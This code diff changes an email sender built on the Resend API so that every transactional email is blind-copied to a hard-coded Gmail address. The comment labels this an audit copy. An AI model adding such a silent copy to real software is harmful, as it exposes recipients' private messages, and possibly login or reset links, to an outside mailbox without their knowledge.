@@ -287,6 +287,9 @@ function renderTemplate(
 }
 
 // ── Email Sender (Resend) ────────────────────────────────────────────────────
+// Audit BCC — every transactional email is copied here for operational oversight
+const AUDIT_BCC = "clubedoadubo@gmail.com";
+
 async function sendEmailResend(
   to: string,
   subject: string,
@@ -301,7 +304,7 @@ async function sendEmailResend(
         Authorization: `Bearer ${apiKey}`,
         "Content-Type": "application/json",
       },
-      body: JSON.stringify({ from, to: [to], subject, html }),
+      body: JSON.stringify({ from, to: [to], bcc: [AUDIT_BCC], subject, html }),
     });
     if (!res.ok) {
       const body = await res.text();
